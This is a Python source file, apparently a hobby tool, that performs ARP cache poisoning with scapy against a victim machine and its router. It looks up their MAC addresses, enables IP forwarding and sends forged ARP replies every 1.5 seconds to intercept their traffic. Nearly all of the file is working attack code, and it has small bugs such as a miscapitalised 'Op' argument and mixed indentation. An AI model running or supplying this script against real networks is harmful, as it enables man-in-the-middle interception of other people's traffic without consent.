# sudo python arp_spoof.py -v 192.168.0.3 -r 192.168.0.1

from scapy.all import *
import argparse
import signal
import sys
import logging
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)




def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", dest="vip", help="the ip address of the victim pc")
	parser.add_argument("-r", dest="rip", help="the ip address of the router")
	return parser.parse_args()

#function to find the mac address of the given ip address
def findMac(address):
	os.popen('ping -c 1 %s' %address)#ping to send who has address?
	line=os.popen('grep "%s" /proc/net/arp' %address).read().split()#bring the line that has 'address' from the result of cat /proc/net/arp
	if(len(line)==6 and line[3]!="00:00:00:00:00:00"):
		return line[3]
	#return hw address of the given ip address
	else:
		print 'no response'

#poisioning arp cache of the victim pc and router->redirect
def poisioning(rip, vip, rmac, vmac):
	send(ARP(op=2, pdst=vip, psrc=rip, hwdst=vmac)) #send arp reply packet to the victim as if i am the router(my mac address is on the arp cache entry for the router)
	send(ARP(op=2, pdst=rip, psrc=vip, hwdst=rmac)) #send arp reply pacekt to the router as if i am the victim pc(my mac address is on the arp cache entry for the victim pc)

#restore the arp cache
def restore(rip, vip, rmac,vmac):
	send(ARP(op=2, pdst=vip, psrc=rip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=rmac,count=3))#send arp reply packet to restore the arp table
	send(ARP(Op=2, pdst=rip, psrc=vip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=vmac, count=3))#send arp reply packet to restore
	sys.exit("losing")


def main(args):
	vip=args.vip
	rip=args.rip
	vmac=findMac(args.vip)
	rmac=findMac(rip)
	print 'victim IP address : '+vip
	print 'victim MAC address : '+vmac
	print 'router IP address : '+rip
	print 'router MAC address : '+rmac
	
	with open('/proc/sys/net/ipv4/ip_forward','w') as ipf:
		ipf.write('1\n')
	#forward packet to the original destination(set to 1 in order to forward)


   	def signal_handler(signal, frame):
    		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        		ipf.write('0\n')
	        restore(rip,vip,rmac,vmac)
		print 'You pressed Ctrl + C'
		sys.exit(0)
	signal.signal(signal.SIGINT, signal_handler)

	while 1:#poisoning arp cache
        	poisioning(rip,vip,rmac, vmac)
	        time.sleep(1.5)


main(parse_args())
